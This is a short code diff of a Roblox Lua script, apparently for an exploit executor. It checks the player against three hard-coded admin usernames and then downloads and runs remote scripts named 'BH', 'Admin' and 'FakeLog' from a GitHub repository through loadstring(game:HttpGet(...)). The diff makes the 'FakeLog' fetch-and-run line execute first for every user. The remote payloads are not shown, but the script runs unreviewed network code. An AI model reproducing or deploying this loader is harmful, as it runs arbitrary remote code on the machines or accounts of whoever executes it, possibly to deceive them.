@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
+
 local Players = game:GetService("Players")
 local AdminNames = {"MaybeFlashh", "ikbengoerge99", "KMONEYBROWN144"}
 local executor = Players.LocalPlayer
@@ -14,12 +16,8 @@ end
 
 if isAdmin(executor) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BH"))()
-    task.wait(1)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/Admin"))()
     task.wait(1)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BH"))()
-    task.wait(1)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
 end
